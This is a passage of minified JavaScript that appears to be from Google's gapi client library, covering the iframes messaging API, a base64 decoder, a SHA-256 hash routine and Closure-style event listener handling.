        (c = oi(this, a)).Hj && c.Hj(c, a),
        (a = b.i.onCreate) && a(c),
        b.i.disableRelayOpen || c.applyIframesApi("_open"),
        c
      );
    };
    var Ci = function (a, b, c) {
        var d = b.i.canvasUrl;
        if (!d) return c;
        D(
          !b.i.allowPost && !b.i.forcePost,
          "Post is not supported when using canvas url"
        );
        var e = b.getUrl();
        return (
          D(
            e && Af(e) === a.Ib && Af(d) === a.Ib,
            "Wrong origin for canvas or hidden url " + d
          ),
          b.setUrl(d),
          (b.i.waitForOnload = !0),
          (b.i.canvasUrl = null),
          function (f) {
            var g = f.getWindow(),
              h = g.location.hash;
            (h = qf(e) + (/#/.test(e) ? h.replace(/^#/, "&") : h)),
              g.location.replace(h),
              c && c(f);
          }
        );
      },
      Di = function (a, b, c) {
        var d = b.i.relayOpen;
        if (d) {
          var e = a.getParentIframe();
          if (
            (d instanceof I
              ? ((e = d), (b.i.relayOpen = 0))
              : 0 < Number(d) && (b.i.relayOpen = Number(d) - 1),
            e)
          )
            return (
              D(!!e.mj, "Relaying iframe open is disabled"),
              (d = b.getStyle()) &&
                (d = si[d]) &&
                (sh(b, a), d(b.value()), sh(b, null)),
              (b.i.openerIframe = null),
              c.resolve(e.mj(b)),
              !0
            );
        }
        return !1;
      },
      Ei = function (a, b, c) {
        var d = b.getStyle();
        if (d) {
          if (
            (D(!!ui, "Defer style is disabled, when requesting style " + d),
            !ri[d])
          )
            return (
              vi(d, function () {
                D(!!ri[d], "Fail to load style - " + d),
                  c.resolve(a.open(b.value()));
              }),
              !0
            );
          Bi(a, b);
        }
        return !1;
      };
    (J.prototype.open = function (a, b) {
      D(!this.isDisposed(), "Cannot open iframe in disposed context");
      var c = new H(a);
      b = Ci(this, c, b);
      var d = new wh(b);
      if (
        ((b = c.getUrl()) && c.setUrl(qf(b)),
        Di(this, c, d) || Ei(this, c, d) || Di(this, c, d))
      )
        return d.promise;
      if (null != lh(c)) {
        var e = setTimeout(function () {
            (g.getIframeEl().src = "about:blank"),
              d.reject({
                timeout: "Exceeded time limit of :" + lh(c) + "milliseconds",
              });
          }, lh(c)),
          f = d.resolve;
        d.resolve = function (h) {
          clearTimeout(e), f(h);
        };
      }
      c.i.waitForOnload &&
        $g(jh(c), function () {
          d.resolve(g);
        });
      var g = this.openChild(a);
      return c.i.waitForOnload || d.resolve(g), d.promise;
    }),
      (J.prototype.getParentIframe = function () {
        return this.Ha;
      });
    var Fi = function (a, b) {
      var c = a.getParentIframe(),
        d = !0;
      return (
        b.filter && (d = b.filter.call(b.hf, b.params)),
        F(d).then(function (e) {
          return (
            !(!e || !c) &&
            (b.nj && b.nj.call(a, b.params),
            (e = b.sender ? b.sender(b.params) : ni(c, b.message, b.params)),
            !b.Am ||
              e.then(function () {
                return !0;
              }))
          );
        })
      );
    };
    (k = J.prototype),
      (k.closeSelf = function (a, b, c) {
        return (
          (a = Fi(this, {
            sender: function (d) {
              var e = Gg.getParentIframe();
              return (
                fd(Gg.kb, function (f) {
                  f !== e && ni(f, "_g_wasClosed", d);
                }),
                ni(e, "_g_closeMe", d)
              );
            },
            message: "_g_closeMe",
            params: a,
            hf: c,
            filter: this.getGlobalParam("onCloseSelfFilter"),
          })),
          (b = new wh(b)).resolve(a),
          b.promise
        );
      }),
      (k.restyleSelf = function (a, b, c) {
        return (
          (a = a || {}),
          (b = new wh(b)).resolve(
            Fi(this, {
              message: "_g_restyleMe",
              params: a,
              hf: c,
              filter: this.getGlobalParam("onRestyleSelfFilter"),
              Am: !0,
              nj: this.Uj,
            })
          ),
          b.promise
        );
      }),
      (k.Uj = function (a) {
        "auto" === a.height && (a.height = zi());
      }),
      (k.setCloseSelfFilter = function (a) {
        this.setGlobalParam("onCloseSelfFilter", a);
      }),
      (k.setRestyleSelfFilter = function (a) {
        this.setGlobalParam("onRestyleSelfFilter", a);
      });
    var Bi = function (a, b) {
      var c = b.getStyle();
      if (c) {
        b.Ij(null);
        var d = ri[c];
        D(d, "No such style: " + c), sh(b, a), d(b.value()), sh(b, null);
      }
    };
    (J.prototype.ready = function (a, b, c, d) {
      var e = b || {},
        f = this.getParentIframe();
      this.addOnOpenerHandler(
        function (h) {
          fd(
            e,
            function (l, m) {
              h.register(m, l, d);
            },
            this
          ),
            h !== f && h.send("_ready", g, void 0, d);
        },
        void 0,
        d
      );
      var g = a || {};
      (g.height = g.height || "auto"),
        this.Uj(g),
        f && f.send("_ready", g, c, Jg);
    }),
      (J.prototype.connectIframes = function (a, b) {
        a = new mh(a);
        var c = new mh(b),
          d = Wg(a);
        b = a.getIframe();
        var e = c.getIframe();
        if (e) {
          var f = Xg(a),
            g = new H();
          uh(b, e, g),
            Vg(Ug(new mh(g.value()).Uc(f), a.i.role), a.i.data).ac(d);
          var h = new H();
          uh(e, b, h),
            Vg(Ug(new mh(h.value()).Uc(f), c.i.role), c.i.data).ac(!0),
            ni(b, "_g_connect", g.value(), function () {
              d || ni(e, "_g_connect", h.value());
            }),
            d && ni(e, "_g_connect", h.value());
        } else
          Vg(Ug(Yg(new mh((c = {}))), a.i.role), a.i.data),
            ni(b, "_g_connect", c);
      });
    var pi = function (a) {
      a.rg || ((a.rg = md()), (a.Xg = md()));
    };
    (J.prototype.addOnConnectHandler = function (a, b, c, d) {
      pi(this),
        "object" == typeof a
          ? (c = (b = new bh(a)).i.role || "")
          : ((b = eh(dh(ch(a), b).ze(c), d)), (c = a)),
        (d = this.rg[c] || []),
        (a = !1);
      for (var e = 0; e < d.length && !a; e++)
        qi(this.kb[d[e].hf.getFrameName()], d[e].data, [b]), (a = b.i.runOnce);
      (c = bd(this.Xg, c, [])), a || b.i.dontWait || c.push(b);
    }),
      (J.prototype.removeOnConnectHandler = function (a, b) {
        if (((a = bd(this.Xg, a, [])), b))
          for (var c = !1, d = 0; !c && d < a.length; d++)
            a[d].i.handler === b && ((c = !0), a.splice(d, 1));
        else a.splice(0, a.length);
      });
    var qi = function (a, b, c) {
      c = c || [];
      for (var d = 0; d < c.length; d++) {
        var e = c[d];
        if (e && a) {
          var f = e.i.filter || Ig;
          if (a && f(a)) {
            f = e.i.apis || [];
            for (var g = 0; g < f.length; g++) a.applyIframesApi(f[g]);
            e.i.handler && (0, e.i.handler)(a, b),
              e.i.runOnce && (c.splice(d, 1), --d);
          }
        }
      }
    };
    (J.prototype.addOnOpenerHandler = function (a, b, c) {
      var d = this.addOnConnectHandler;
      ((a = eh(dh(ch("_opener"), a).ze(b), c)).i.runOnce = !0),
        d.call(this, a.value());
    }),
      (J.prototype.Wi = function (a, b) {
        var c = a.i.controller;
        if (c) {
          D(
            c.Ib === a.getOrigin(),
            "Wrong controller origin " + this.Ib + " !== " + a.getOrigin()
          );
          var d = a.ob();
          ph(a, c.ob()), qh(a, c.Fb());
          var e = new H();
          kh(ph(e, d), a.i.controllerData),
            Yd(b, "load", function () {
              c.send("_g_control", e.value());
            });
        }
      });
    var Gi = function (a, b, c) {
      var d = (a = a.getWindow()).document,
        e = c.i.reuseWindow;
      if (e) {
        var f = c.getId();
        if (!f)
          throw Error(
            "If you provide a reuseWindow, you must also provide an ID"
          );
      } else f = hf(d, c);
      var g = f,
        h = c.i.rpcRelayUrl;
      if (h) {
        (h = Ud($c, h.replace(of, pf))),
          ((g = c.i.fragmentParams || {}).rly = f),
          (c.i.fragmentParams = g),
          (g = c.i.where || d.body),
          D(!!g, "Cannot open window in a page with no body");
        var l = {};
        (l.src = h),
          (l.style = "display:none;"),
          (l.id = f),
          (l.name = f),
          mf(d, g, l, f),
          (g = f + "_relay");
      }
      b = qf(b);
      var m = kf(d, b, f, c.value());
      if (
        ((c.i.eurl = m),
        "string" != typeof (b = c.i.openAsWindow) && (b = void 0),
        (c = window.navigator.userAgent || ""),
        /Trident|MSIE/i.test(c) &&
          /#/.test(c) &&
          (m =
            "javascript:window.location.replace(" +
            C.JSON.stringify(m).replace(/#/g, "\\x23") +
            ")"),
        e)
      ) {
        var q = e;
        setTimeout(function () {
          q.location.replace(m);
        });
      } else q = Jd(a, m, g, b);
      return { id: f, ak: q };
    };
    (J.prototype.Di = function (a, b) {
      if (b.i.openAsWindow) {
        var c = (a = Gi(this, a, b)).id;
        D(!!a.ak, "Open popup window failed"), (b.i._popupWindow = a.ak);
      }
      return c;
    }),
      (Eg = md()),
      (Fg = md()),
      (Gg = new J()),
      Pg("_g_rpcReady", I.prototype.ac),
      Pg("_g_discover", I.prototype.Pk),
      Pg("_g_ping", I.prototype.Ml),
      Pg("_g_close", I.prototype.rk),
      Pg("_g_closeMe", I.prototype.sk),
      Pg("_g_restyle", I.prototype.am),
      Pg("_g_restyleMe", I.prototype.bm),
      Pg("_g_wasClosed", I.prototype.Bm),
      Og("control", "_g_control", I.prototype.vk),
      Og("control", "_g_disposeControl", I.prototype.Bk);
    var Hi = Gg.getParentIframe();
    Hi && Hi.register("_g_restyleDone", I.prototype.Zl, Jg),
      Pg("_g_connect", I.prototype.tk);
    var Ii = {};
    (Ii._g_open = I.prototype.Jl), Ng("_open", Ii, Jg);
    var Ji = {
      Context: J,
      Iframe: I,
      SAME_ORIGIN_IFRAMES_FILTER: Ig,
      CROSS_ORIGIN_IFRAMES_FILTER: Jg,
      makeWhiteListIframesFilter: Kg,
      getContext: Qg,
      registerIframesApi: Ng,
      registerIframesApiHandler: Og,
      registerStyle: ti,
      registerBeforeOpenStyle: wi,
      getStyle: ui,
      getBeforeOpenStyle: xi,
      create: rf,
    };
    Qf({
      instance: function () {
        return Ji;
      },
      priority: 2,
    }),
      Og("gapi.load", "_g_gapi.load", function (a) {
        return new E(function (b) {
          od.load((a && "object" == typeof a && a.features) || "", b);
        });
      }),
      r("gapi.iframes.registerStyle", ti),
      r("gapi.iframes.registerBeforeOpenStyle", wi),
      r("gapi.iframes.getStyle", ui),
      r("gapi.iframes.getBeforeOpenStyle", xi),
      r("gapi.iframes.registerIframesApi", Ng),
      r("gapi.iframes.registerIframesApiHandler", Og),
      r("gapi.iframes.getContext", Qg),
      r("gapi.iframes.SAME_ORIGIN_IFRAMES_FILTER", Ig),
      r("gapi.iframes.CROSS_ORIGIN_IFRAMES_FILTER", Jg),
      r("gapi.iframes.makeWhiteListIframesFilter", Kg),
      r("gapi.iframes.Context", J),
      r("gapi.iframes.Context.prototype.isDisposed", J.prototype.isDisposed),
      r("gapi.iframes.Context.prototype.getWindow", J.prototype.getWindow),
      r(
        "gapi.iframes.Context.prototype.getFrameName",
        J.prototype.getFrameName
      ),
      r(
        "gapi.iframes.Context.prototype.getGlobalParam",
        J.prototype.getGlobalParam
      ),
      r(
        "gapi.iframes.Context.prototype.setGlobalParam",
        J.prototype.setGlobalParam
      ),
      r("gapi.iframes.Context.prototype.open", J.prototype.open),
      r("gapi.iframes.Context.prototype.openChild", J.prototype.openChild),
      r(
        "gapi.iframes.Context.prototype.getParentIframe",
        J.prototype.getParentIframe
      ),
      r("gapi.iframes.Context.prototype.closeSelf", J.prototype.closeSelf),
      r("gapi.iframes.Context.prototype.restyleSelf", J.prototype.restyleSelf),
      r(
        "gapi.iframes.Context.prototype.setCloseSelfFilter",
        J.prototype.setCloseSelfFilter
      ),
      r(
        "gapi.iframes.Context.prototype.setRestyleSelfFilter",
        J.prototype.setRestyleSelfFilter
      ),
      r(
        "gapi.iframes.Context.prototype.addOnConnectHandler",
        J.prototype.addOnConnectHandler
      ),
      r(
        "gapi.iframes.Context.prototype.removeOnConnectHandler",
        J.prototype.removeOnConnectHandler
      ),
      r(
        "gapi.iframes.Context.prototype.addOnOpenerHandler",
        J.prototype.addOnOpenerHandler
      ),
      r(
        "gapi.iframes.Context.prototype.connectIframes",
        J.prototype.connectIframes
      ),
      r("gapi.iframes.Iframe", I),
      r("gapi.iframes.Iframe.prototype.isDisposed", I.prototype.isDisposed),
      r("gapi.iframes.Iframe.prototype.getContext", I.prototype.getContext),
      r("gapi.iframes.Iframe.prototype.getFrameName", I.prototype.getFrameName),
      r("gapi.iframes.Iframe.prototype.getId", I.prototype.getId),
      r("gapi.iframes.Iframe.prototype.register", I.prototype.register),
      r("gapi.iframes.Iframe.prototype.unregister", I.prototype.unregister),
      r("gapi.iframes.Iframe.prototype.send", I.prototype.send),
      r(
        "gapi.iframes.Iframe.prototype.applyIframesApi",
        I.prototype.applyIframesApi
      ),
      r("gapi.iframes.Iframe.prototype.getIframeEl", I.prototype.getIframeEl),
      r("gapi.iframes.Iframe.prototype.getSiteEl", I.prototype.getSiteEl),
      r("gapi.iframes.Iframe.prototype.setSiteEl", I.prototype.setSiteEl),
      r("gapi.iframes.Iframe.prototype.getWindow", I.prototype.getWindow),
      r("gapi.iframes.Iframe.prototype.getOrigin", I.prototype.getOrigin),
      r("gapi.iframes.Iframe.prototype.close", I.prototype.close),
      r("gapi.iframes.Iframe.prototype.restyle", I.prototype.restyle),
      r("gapi.iframes.Iframe.prototype.restyleDone", I.prototype.Yl),
      r(
        "gapi.iframes.Iframe.prototype.registerWasRestyled",
        I.prototype.registerWasRestyled
      ),
      r(
        "gapi.iframes.Iframe.prototype.registerWasClosed",
        I.prototype.registerWasClosed
      ),
      r("gapi.iframes.Iframe.prototype.getParam", I.prototype.getParam),
      r("gapi.iframes.Iframe.prototype.setParam", I.prototype.setParam),
      r("gapi.iframes.Iframe.prototype.ping", I.prototype.ping),
      r("gapi.iframes.Iframe.prototype.getOpenParams", I.prototype.yi),
      r("gapi.iframes.create", rf);
    var Ki = function (a) {
        return Array.prototype.map
          .call(a, function (b) {
            return 1 < (b = b.toString(16)).length ? b : "0" + b;
          })
          .join("");
      },
      Li = null,
      Ni = function (a) {
        var b = [];
        return (
          Mi(a, function (c) {
            b.push(c);
          }),
          b
        );
      },
      Mi = function (a, b) {
        function c(l) {
          for (; d < a.length; ) {
            var m = a.charAt(d++),
              q = Li[m];
            if (null != q) return q;
            if (!/^[\s\xa0]*$/.test(m))
              throw Error("Unknown base64 encoding at char: " + m);
          }
          return l;
        }
        Oi();
        for (var d = 0; ; ) {
          var e = c(-1),
            f = c(0),
            g = c(64),
            h = c(64);
          if (64 === h && -1 === e) break;
          b((e << 2) | (f >> 4)),
            64 != g &&
              (b(((f << 4) & 240) | (g >> 2)),
              64 != h && b(((g << 6) & 192) | h));
        }
      },
      Oi = function () {
        if (!Li) {
          Li = {};
          for (
            var a =
                "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789".split(
                  ""
                ),
              b = ["+/=", "+/", "-_=", "-_.", "-_"],
              c = 0;
            5 > c;
            c++
          )
            for (var d = a.concat(b[c].split("")), e = 0; e < d.length; e++) {
              var f = d[e],
                g = Li[f];
              void 0 === g ? (Li[f] = e) : w(g === e);
            }
        }
      },
      Ri = function (a, b) {
        (this.blockSize = -1),
          (this.blockSize = 64),
          (this.Re = p.Uint8Array
            ? new Uint8Array(this.blockSize)
            : Array(this.blockSize)),
          (this.bc = this.qd = 0),
          (this.na = []),
          (this.Bl = a),
          (this.Mi = b),
          (this.zm = p.Int32Array ? new Int32Array(64) : Array(64)),
          void 0 === Pi && (Pi = p.Int32Array ? new Int32Array(Qi) : Qi),
          this.reset();
      },
      Pi;
    v(Ri, Oe);
    for (var Si = [], Ti = 0; 63 > Ti; Ti++) Si[Ti] = 0;
    var Ui = [].concat(128, Si);
    Ri.prototype.reset = function () {
      (this.bc = this.qd = 0),
        (this.na = p.Int32Array ? new Int32Array(this.Mi) : Ua(this.Mi));
    };
    var Vi = function (a) {
      var b = a.Re;
      w(b.length == a.blockSize);
      for (var c = a.zm, d = 0, e = 0; e < b.length; )
        (c[d++] = (b[e] << 24) | (b[e + 1] << 16) | (b[e + 2] << 8) | b[e + 3]),
          (e = 4 * d);
      for (b = 16; 64 > b; b++) {
        (e = 0 | c[b - 15]), (d = 0 | c[b - 2]);
        var f =
            ((0 | c[b - 16]) +
              (((e >>> 7) | (e << 25)) ^
                ((e >>> 18) | (e << 14)) ^
                (e >>> 3))) |
            0,
          g =
            ((0 | c[b - 7]) +
              (((d >>> 17) | (d << 15)) ^
                ((d >>> 19) | (d << 13)) ^
                (d >>> 10))) |
            0;
        c[b] = (f + g) | 0;
      }
      (d = 0 | a.na[0]), (e = 0 | a.na[1]);
      var h = 0 | a.na[2],
        l = 0 | a.na[3],
        m = 0 | a.na[4],
        q = 0 | a.na[5],
        y = 0 | a.na[6];
      for (f = 0 | a.na[7], b = 0; 64 > b; b++) {
        var B =
          ((((d >>> 2) | (d << 30)) ^
            ((d >>> 13) | (d << 19)) ^
            ((d >>> 22) | (d << 10))) +
            ((d & e) ^ (d & h) ^ (e & h))) |
          0;
        (g =
          ((f =
            (f +
              (((m >>> 6) | (m << 26)) ^
                ((m >>> 11) | (m << 21)) ^
                ((m >>> 25) | (m << 7)))) |
            0) +
            (((g = ((g = (m & q) ^ (~m & y)) + (0 | Pi[b])) | 0) + (0 | c[b])) |
              0)) |
          0),
          (f = y),
          (y = q),
          (q = m),
          (m = (l + g) | 0),
          (l = h),
          (h = e),
          (e = d),
          (d = (g + B) | 0);
      }
      (a.na[0] = (a.na[0] + d) | 0),
        (a.na[1] = (a.na[1] + e) | 0),
        (a.na[2] = (a.na[2] + h) | 0),
        (a.na[3] = (a.na[3] + l) | 0),
        (a.na[4] = (a.na[4] + m) | 0),
        (a.na[5] = (a.na[5] + q) | 0),
        (a.na[6] = (a.na[6] + y) | 0),
        (a.na[7] = (a.na[7] + f) | 0);
    };
    (Ri.prototype.update = function (a, b) {
      void 0 === b && (b = a.length);
      var c = 0,
        d = this.qd;
      if ("string" == typeof a)
        for (; c < b; )
          (this.Re[d++] = a.charCodeAt(c++)),
            d == this.blockSize && (Vi(this), (d = 0));
      else {
        if (!wa(a)) throw Error("message must be string or array");
        for (; c < b; ) {
          var e = a[c++];
          if (!("number" == typeof e && 0 <= e && 255 >= e && e == (0 | e)))
            throw Error("message must be a byte array");
          (this.Re[d++] = e), d == this.blockSize && (Vi(this), (d = 0));
        }
      }
      (this.qd = d), (this.bc += b);
    }),
      (Ri.prototype.digest = function () {
        var a = [],
          b = 8 * this.bc;
        56 > this.qd
          ? this.update(Ui, 56 - this.qd)
          : this.update(Ui, this.blockSize - (this.qd - 56));
        for (var c = 63; 56 <= c; c--) (this.Re[c] = 255 & b), (b /= 256);
        for (Vi(this), c = b = 0; c < this.Bl; c++)
          for (var d = 24; 0 <= d; d -= 8) a[b++] = (this.na[c] >> d) & 255;
        return a;
      });
    var Qi = [
        1116352408, 1899447441, 3049323471, 3921009573, 961987163, 1508970993,
        2453635748, 2870763221, 3624381080, 310598401, 607225278, 1426881987,
        1925078388, 2162078206, 2614888103, 3248222580, 3835390401, 4022224774,
        264347078, 604807628, 770255983, 1249150122, 1555081692, 1996064986,
        2554220882, 2821834349, 2952996808, 3210313671, 3336571891, 3584528711,
        113926993, 338241895, 666307205, 773529912, 1294757372, 1396182291,
        1695183700, 1986661051, 2177026350, 2456956037, 2730485921, 2820302411,
        3259730800, 3345764771, 3516065817, 3600352804, 4094571909, 275423344,
        430227734, 506948616, 659060556, 883997877, 958139571, 1322822218,
        1537002063, 1747873779, 1955562222, 2024104815, 2227730452, 2361852424,
        2428436474, 2756734187, 3204031479, 3329325298,
      ],
      Xi = function () {
        Ri.call(this, 8, Wi);
      };
    v(Xi, Ri);
    var Wi = [
        1779033703, 3144134277, 1013904242, 2773480762, 1359893119, 2600822924,
        528734635, 1541459225,
      ],
      Yi = function () {
        (this.Cb = this.Cb), (this.zf = this.zf);
      };
    (Yi.prototype.Cb = !1),
      (Yi.prototype.isDisposed = function () {
        return this.Cb;
      }),
      (Yi.prototype.Gc = function () {
        this.Cb || ((this.Cb = !0), this.Vd());
      }),
      (Yi.prototype.Vd = function () {
        if (this.zf) for (; this.zf.length; ) this.zf.shift()();
      });
    var Zi = function (a, b) {
      (this.type = a),
        (this.currentTarget = this.target = b),
        (this.defaultPrevented = this.te = !1);
    };
    (Zi.prototype.stopPropagation = function () {
      this.te = !0;
    }),
      (Zi.prototype.preventDefault = function () {
        this.defaultPrevented = !0;
      });
    var $i = (function () {
        if (!p.addEventListener || !Object.defineProperty) return !1;
        var a = !1,
          b = Object.defineProperty({}, "passive", {
            get: function () {
              a = !0;
            },
          });
        try {
          var c = function () {};
          p.addEventListener("test", c, b), p.removeEventListener("test", c, b);
        } catch (d) {}
        return a;
      })(),
      aj = function (a, b) {
        Zi.call(this, a ? a.type : ""),
          (this.relatedTarget = this.currentTarget = this.target = null),
          (this.button =
            this.screenY =
            this.screenX =
            this.clientY =
            this.clientX =
            this.offsetY =
            this.offsetX =
              0),
          (this.key = ""),
          (this.charCode = this.keyCode = 0),
          (this.metaKey = this.shiftKey = this.altKey = this.ctrlKey = !1),
          (this.state = null),
          (this.pointerId = 0),
          (this.pointerType = ""),
          (this.timeStamp = 0),
          (this.Ya = null),
          a && this.init(a, b);
      };
    v(aj, Zi);
    var bj = pd({ 2: "touch", 3: "pen", 4: "mouse" });
    (aj.prototype.init = function (a, b) {
      var c = (this.type = a.type),
        d =
          a.changedTouches && a.changedTouches.length
            ? a.changedTouches[0]
            : null;
      if (
        ((this.target = a.target || a.srcElement),
        (this.currentTarget = b),
        (b = a.relatedTarget))
      ) {
        if (vc) {
          a: {
            try {
              qc(b.nodeName);
              var e = !0;
              break a;
            } catch (f) {}
            e = !1;
          }
          e || (b = null);
        }
      } else
        "mouseover" == c
          ? (b = a.fromElement)
          : "mouseout" == c && (b = a.toElement);
      (this.relatedTarget = b),
        d
          ? ((this.clientX = void 0 !== d.clientX ? d.clientX : d.pageX),
            (this.clientY = void 0 !== d.clientY ? d.clientY : d.pageY),
            (this.screenX = d.screenX || 0),
            (this.screenY = d.screenY || 0))
          : ((this.offsetX = wc || void 0 !== a.offsetX ? a.offsetX : a.layerX),
            (this.offsetY = wc || void 0 !== a.offsetY ? a.offsetY : a.layerY),
            (this.clientX = void 0 !== a.clientX ? a.clientX : a.pageX),
            (this.clientY = void 0 !== a.clientY ? a.clientY : a.pageY),
            (this.screenX = a.screenX || 0),
            (this.screenY = a.screenY || 0)),
        (this.button = a.button),
        (this.keyCode = a.keyCode || 0),
        (this.key = a.key || ""),
        (this.charCode = a.charCode || ("keypress" == c ? a.keyCode : 0)),
        (this.ctrlKey = a.ctrlKey),
        (this.altKey = a.altKey),
        (this.shiftKey = a.shiftKey),
        (this.metaKey = a.metaKey),
        (this.pointerId = a.pointerId || 0),
        (this.pointerType =
          "string" == typeof a.pointerType
            ? a.pointerType
            : bj[a.pointerType] || ""),
        (this.state = a.state),
        (this.timeStamp = a.timeStamp),
        (this.Ya = a),
        a.defaultPrevented && aj.Id.preventDefault.call(this);
    }),
      (aj.prototype.stopPropagation = function () {
        aj.Id.stopPropagation.call(this),
          this.Ya.stopPropagation
            ? this.Ya.stopPropagation()
            : (this.Ya.cancelBubble = !0);
      }),
      (aj.prototype.preventDefault = function () {
        aj.Id.preventDefault.call(this);
        var a = this.Ya;
        a.preventDefault ? a.preventDefault() : (a.returnValue = !1);
      }),
      (aj.prototype.Mk = function () {
        return this.Ya;
      });
    var cj = "closure_listenable_" + ((1e6 * Math.random()) | 0),
      dj = 0,
      ej = function (a, b, c, d, e) {
        (this.listener = a),
          (this.proxy = null),
          (this.src = b),
          (this.type = c),
          (this.capture = !!d),
          (this.af = e),
          (this.key = ++dj),
          (this.xe = this.Ne = !1);
      },
      fj = function (a) {
        (a.xe = !0),
          (a.listener = null),
          (a.proxy = null),
          (a.src = null),
          (a.af = null);
      },
      gj = function (a) {
        (this.src = a), (this.Qa = {}), (this.Ge = 0);
      };
    (gj.prototype.add = function (a, b, c, d, e) {
      var f = a.toString();
      (a = this.Qa[f]) || ((a = this.Qa[f] = []), this.Ge++);
      var g = hj(a, b, d, e);
      return (
        -1 < g
          ? ((b = a[g]), c || (b.Ne = !1))
          : (((b = new ej(b, this.src, f, !!d, e)).Ne = c), a.push(b)),
        b
      );
    }),
      (gj.prototype.remove = function (a, b, c, d) {
        if (!((a = a.toString()) in this.Qa)) return !1;
        var e = this.Qa[a];
        return (
          -1 < (b = hj(e, b, c, d)) &&
          (fj(e[b]),
          Sa(e, b),
          0 == e.length && (delete this.Qa[a], this.Ge--),
          !0)
        );
      });
    var ij = function (a, b) {
      var c = b.type;
      c in a.Qa &&
        Ra(a.Qa[c], b) &&
        (fj(b), 0 == a.Qa[c].length && (delete a.Qa[c], a.Ge--));
    };
    (gj.prototype.removeAll = function (a) {
      a = a && a.toString();
      var c,
        b = 0;
      for (c in this.Qa)
        if (!a || c == a) {
          for (var d = this.Qa[c], e = 0; e < d.length; e++) ++b, fj(d[e]);
          delete this.Qa[c], this.Ge--;
        }
      return b;
    }),
      (gj.prototype.Gg = function (a, b, c, d) {
        var e = -1;
        return (
          (a = this.Qa[a.toString()]) && (e = hj(a, b, c, d)),
          -1 < e ? a[e] : null
        );
      }),
      (gj.prototype.hasListener = function (a, b) {
        var c = void 0 !== a,
          d = c ? a.toString() : "",
          e = void 0 !== b;
        return Xa(this.Qa, function (f) {
          for (var g = 0; g < f.length; ++g)
            if (!((c && f[g].type != d) || (e && f[g].capture != b))) return !0;
          return !1;
        });
      });
    var hj = function (a, b, c, d) {
        for (var e = 0; e < a.length; ++e) {
          var f = a[e];
          if (!f.xe && f.listener == b && f.capture == !!c && f.af == d)
            return e;
        }
        return -1;
      },
      jj = "closure_lm_" + ((1e6 * Math.random()) | 0),
      kj = {},
      lj = 0,
      nj = function (a, b, c, d, e) {
        if (d && d.once) mj(a, b, c, d, e);
        else if (Array.isArray(b))
          for (var f = 0; f < b.length; f++) nj(a, b[f], c, d, e);
        else
          (c = oj(c)),
            a && a[cj]
              ? a.listen(b, c, t(d) ? !!d.capture : !!d, e)
              : pj(a, b, c, !1, d, e);
      },
      pj = function (a, b, c, d, e, f) {
        if (!b) throw Error("Invalid event type");
        var g = t(e) ? !!e.capture : !!e,
          h = qj(a);
        if ((h || (a[jj] = h = new gj(a)), !(c = h.add(b, c, d, g, f)).proxy)) {
          if (
            ((d = rj()),
            (c.proxy = d),
            (d.src = a),
            (d.listener = c),
            a.addEventListener)
          )
            $i || (e = g),
              void 0 === e && (e = !1),
              a.addEventListener(b.toString(), d, e);
          else if (a.attachEvent) a.attachEvent(sj(b.toString()), d);
          else {
            if (!a.addListener || !a.removeListener)
              throw Error("addEventListener and attachEvent are unavailable.");
            w("change" === b, "MediaQueryList only has a change event"),
              a.addListener(d);
          }
          lj++;
        }
      },
      rj = function () {
        var a = tj,
          b = function (c) {
            return a.call(b.src, b.listener, c);
          };
        return b;
      },
      mj = function (a, b, c, d, e) {
        if (Array.isArray(b))
          for (var f = 0; f < b.length; f++) mj(a, b[f], c, d, e);
        else
          (c = oj(c)),
            a && a[cj]
              ? uj(a, b, c, t(d) ? !!d.capture : !!d, e)
              : pj(a, b, c, !0, d, e);
      },
      vj = function (a, b, c, d, e) {
        if (Array.isArray(b))
          for (var f = 0; f < b.length; f++) vj(a, b[f], c, d, e);
        else
          (d = t(d) ? !!d.capture : !!d),
            (c = oj(c)),
            a && a[cj]
              ? a.Eb.remove(String(b), c, d, e)
              : a && (a = qj(a)) && (b = a.Gg(b, c, d, e)) && wj(b);
      },
      wj = function (a) {
        if ("number" != typeof a && a && !a.xe) {
          var b = a.src;
          if (b && b[cj]) ij(b.Eb, a);
          else {
            var c = a.type,
              d = a.proxy;
            b.removeEventListener
              ? b.removeEventListener(c, d, a.capture)
              : b.detachEvent
              ? b.detachEvent(sj(c), d)
              : b.addListener && b.removeListener && b.removeListener(d),
              lj--,
              (c = qj(b))
                ? (ij(c, a), 0 == c.Ge && ((c.src = null), (b[jj] = null)))
                : fj(a);
          }
        }
      },
      sj = function (a) {
        return a in kj ? kj[a] : (kj[a] = "on" + a);
      },
      tj = function (a, b) {
        if (a.xe) a = !0;
        else {
          b = new aj(b, this);
          var c = a.listener,
            d = a.af || a.src;
          a.Ne && wj(a), (a = c.call(d, b));
        }
        return a;
      },
      qj = function (a) {
        return (a = a[jj]) instanceof gj ? a : null;
      },
      xj = "__closure_events_fn_" + ((1e9 * Math.random()) >>> 0),
      oj = function (a) {
        return (
          w(a, "Listener can not be null."),
          "function" == typeof a
            ? a
            : (w(
                a.handleEvent,
                "An object listener must have handleEvent method."
              ),
              a[xj] ||
                (a[xj] = function (b) {
                  return a.handleEvent(b);
                }),
              a[xj])
        );
      },
      yj = function () {
        Yi.call(this),
          (this.Eb = new gj(this)),
          (this.ik = this),
          (this.dh = null);
      };
    v(yj, Yi),
      (yj.prototype[cj] = !0),
      (k = yj.prototype),
      (k.addEventListener = function (a, b, c, d) {
        nj(this, a, b, c, d);
      }),
      (k.removeEventListener = function (a, b, c, d) {
        vj(this, a, b, c, d);
      }),
      (k.dispatchEvent = function (a) {
        zj(this);
        var b = this.dh;
        if (b)
          for (var c = [], d = 1; b; b = b.dh)
            c.push(b), w(1e3 > ++d, "infinite loop");
        if (((b = this.ik), (d = a.type || a), "string" == typeof a))
          a = new Zi(a, b);
        else if (a instanceof Zi) a.target = a.target || b;
        else {
          var e = a;
          ab((a = new Zi(d, b)), e);
        }
        if (((e = !0), c))
          for (var f = c.length - 1; !a.te && 0 <= f; f--) {
            var g = (a.currentTarget = c[f]);
            e = Aj(g, d, !0, a) && e;
          }
        if (
          (a.te ||
            ((g = a.currentTarget = b),
            (e = Aj(g, d, !0, a) && e),
            a.te || (e = Aj(g, d, !1, a) && e)),
          c)
        )
          for (f = 0; !a.te && f < c.length; f++)
            (g = a.currentTarget = c[f]), (e = Aj(g, d, !1, a) && e);
        return e;
      }),
      (k.Vd = function () {
        yj.Id.Vd.call(this),
          this.Eb && this.Eb.removeAll(void 0),
          (this.dh = null);
      }),
      (k.listen = function (a, b, c, d) {
